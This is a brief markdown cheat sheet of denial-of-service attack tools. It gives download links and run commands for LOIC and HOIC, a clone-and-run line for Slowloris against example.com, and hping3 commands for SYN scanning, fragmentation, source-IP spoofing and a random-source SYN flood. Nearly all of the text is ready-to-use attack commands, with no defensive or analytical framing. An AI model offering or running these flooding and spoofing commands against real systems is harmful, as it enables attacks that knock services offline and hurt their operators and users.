# DOS Attack Tools

## LOIC - Low Orbit Ion Cannon


Install mono-complete package *(its used to run some .exe programs on linux)*

```sh
sudo apt install mono-complete
```

> Download: https://sourceforge.net/projects/loicdownload6968/ 

Extract loic.exe file and then run

```sh
sudo mono loic.exe
```

## HOIC - High Orbit Ion Cannon

> Download: https://sourceforge.net/projects/high-orbit-ion-cannon/files/HOIC.zip/download

Run on Windows VM


## Slowloris

```
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py example.com
```

## hping3

```
hping3 -1 target -c 4    --- -1 ICMP  -c count
```
```
hping3 -S target -p 80 -c 3
```

```
hping3 -S target -p 80 -f
```

```
hping3 -S target -a fake-ip -p 80
```

```
hping3 -S target -p 80 –rand-source –flood
```
